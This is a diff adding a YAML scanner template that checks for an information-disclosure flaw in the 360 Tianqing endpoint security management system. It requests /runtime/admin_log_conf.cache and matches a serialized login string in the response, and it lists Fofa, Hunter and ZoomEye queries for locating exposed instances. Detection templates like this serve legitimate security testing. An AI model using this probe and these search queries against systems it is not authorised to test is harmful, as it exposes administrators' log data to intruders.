@@ -1,0 +1,31 @@
+id: qianxin-360tianqing-adminlogconf-disclosure
+
+info:
+  name: 360新天擎终端安全管理系统信息泄露漏洞
+  author: zan8in
+  severity: high
+  description: |
+    Fofa: title="360新天擎"
+    Hunter: web.title="360新天擎"
+    ZoomEye: app:"Tianqing terminal management"
+  reference:
+    - https://mp.weixin.qq.com/s/_Hoi_ESDEEIL81RY37nDcQ
+  tags: qianxin,360tianqing,disclosure
+flow: |
+  http("r0")
+
+http:
+  - id: "r0"
+    raw:
+      - |
+        GET /runtime/admin_log_conf.cache HTTP/1.1
+        Host: {{Hostname}}
+
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,"s:12:\"/login/login\"")
+        condition: and
+
